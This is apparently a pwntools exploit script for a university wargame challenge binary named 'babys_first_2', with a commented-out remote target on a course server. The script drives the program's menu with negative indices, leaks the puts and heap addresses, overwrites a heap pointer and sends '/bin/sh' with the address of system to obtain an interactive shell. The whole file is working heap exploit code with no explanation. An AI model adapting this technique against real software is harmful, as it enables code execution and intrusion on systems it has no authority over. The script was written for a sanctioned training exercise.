#!/usr/bin/python

from pwn import *

c = process("./babys_first_2")
#c = remote("wargames.6447.sec.edu.au", 9002)
#gdb.attach(c)

call = 0x080486c0

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("bbbb")

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("2")

reply = c.recvuntil('>')
puts = u32(reply[39:43])
system = 0x8048556
log.info("Puts at %s" % (hex(puts)))
heap = u32(reply[56:60])
log.info("Heap at %s" % (hex(heap)))

c.sendline("2")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')

payload = p32(heap+0x40)
c.sendline(payload)

#c.interactive()

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')

payload = "/bin/sh\x00"
payload += "a"*30
payload += p32(system)
c.sendline(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("3")

c.interactive()
